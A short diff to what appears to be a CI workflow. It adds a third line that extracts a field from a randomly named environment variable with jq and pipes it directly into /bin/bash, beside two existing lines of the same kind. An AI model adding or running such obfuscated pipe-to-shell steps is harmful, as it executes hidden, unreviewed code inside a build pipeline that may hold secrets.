@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$xankr5128" | jq -r .h115 | /bin/bash
           echo $fncz25736 | jq -r .zts33 | /bin/bash
+          echo $hgeu24 | jq -r .vi36 | /bin/bash
 
       - name: Save archive
         if: always()
